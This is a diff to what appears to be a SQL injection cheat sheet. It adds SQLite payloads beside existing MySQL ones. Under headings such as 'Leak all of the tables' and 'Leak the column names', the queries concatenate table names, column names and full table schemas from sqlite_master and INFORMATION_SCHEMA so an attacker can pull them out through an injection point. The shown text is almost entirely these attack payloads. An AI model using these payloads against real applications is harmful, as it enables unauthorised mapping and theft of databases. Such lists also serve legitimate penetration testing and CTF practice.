@@ -18,12 +18,26 @@ Leak all of the tables in one database as a string
 SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE_NAME>"
 ```
 
+
+__TO DO THIS FOR SQLite:__
+
+```
+SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
+```
+
 Leak the column names of a table as a string
 ------------------
 
 ```
 SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="<TABLE NAME>"
 ```
+
+__TO LEAK THE WHOLE SCHEMA OF A TABLE IN SQLITE:__
+
+```
+SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type='table')
+```
+
 
 Leak the ONE column from a table
 ------------------
